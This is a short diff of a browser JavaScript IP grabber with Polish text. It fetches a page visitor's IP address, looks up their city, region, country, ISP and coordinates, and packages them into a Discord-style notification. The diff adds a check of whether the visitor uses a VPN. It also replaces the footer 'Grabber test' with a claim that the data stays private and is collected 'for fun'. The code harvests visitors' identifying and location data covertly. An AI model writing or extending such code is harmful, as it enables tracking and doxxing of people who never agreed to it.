@@ -8,12 +8,16 @@ fetch('https://api.ipify.org?format=json')
     fetch('https://ipinfo.io/' + ip + '/json')
       .then(resp => resp.json())
       .then(ipinfo => {
+        let vpn = 'nieznane';
+        if (ipinfo.privacy && typeof ipinfo.privacy.vpn !== 'undefined') {
+          vpn = ipinfo.privacy.vpn ? 'TAK' : 'NIE';
+        }
         const embed = {
           embeds: [{
             title: "Nowe wejście na stronę",
-            description: `Adres IP: **${ip}**\nMiasto: ${ipinfo.city || 'Brak'}\nRegion: ${ipinfo.region || 'Brak'}\nKraj: ${ipinfo.country || 'Brak'}\nISP: ${ipinfo.org || 'Brak'}\nLokacja: ${ipinfo.loc || 'Brak'}`,
+            description: `Adres IP: **${ip}**\nMiasto: ${ipinfo.city || 'Brak'}\nRegion: ${ipinfo.region || 'Brak'}\nKraj: ${ipinfo.country || 'Brak'}\nISP: ${ipinfo.org || 'Brak'}\nLokacja: ${ipinfo.loc || 'Brak'}\nVPN: ${vpn}`,
             color: 5814783,
-            footer: { text: "Grabber test by juliu" },
+            footer: { text: "twoje ip nie zostanie upulicznione! | robię to 4fun!" },
             timestamp: new Date().toISOString()
           }]
         };
